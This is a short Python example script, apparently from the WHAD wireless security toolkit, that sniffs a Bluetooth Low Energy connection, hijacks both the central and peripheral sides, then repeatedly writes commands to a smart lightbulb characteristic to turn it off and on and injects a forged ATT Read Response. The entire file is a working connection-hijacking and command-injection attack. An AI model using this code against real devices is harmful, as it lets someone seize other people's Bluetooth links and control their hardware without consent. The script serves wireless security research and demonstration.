from whad.ble import Sniffer, Hijacker, Central, Peripheral
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from time import time,sleep
from whad.ble.profile import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
import sys
from whad.cli.ui import info, success, error

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        try:
            # Create the device
            dev = WhadDevice.create(interface)

            # Wait for a new connection
            sniffer = Sniffer(dev)
            connection = sniffer.wait_new_connection()


            # A new connection has been sniffed and we are synchronized
            info("Press enter to hijack.")
            input()

            # Start the hijacking attack on both master & slave
            hijacker = Hijacker(dev, connection)
            attack_success = hijacker.hijack(master=True, slave=True)
            # if attack is successful, get Central & Peripheral connectors
            if attack_success:
                success("Master and Slave successfully hijacked !")
                central = hijacker.central
                peripheral = hijacker.peripheral

                if central is not None and peripheral is not None:

                    # Perform a discovery operation
                    periph = central.peripheral()
                    periph.discover()

                    # Interact with Central and Peripheral successively
                    c = periph.get_characteristic(UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"), UUID("a8b3fff1-4834-4051-89d0-3de95cddd318"))
                    while True:
                        info("Press enter to turn off the lightbulb.")
                        input()
                        c.write(bytes.fromhex("5510000d0a"))
                        info("Press enter to turn on the lightbulb.")
                        input()
                        c.write(bytes.fromhex("5510010d0a"))
                        info("Press enter to send a Read Response.")
                        input()
                        peripheral.send_pdu(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_Response(value=b"ABCD"))

            else:
                error("Attack failed, exiting...")
                dev.close()

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
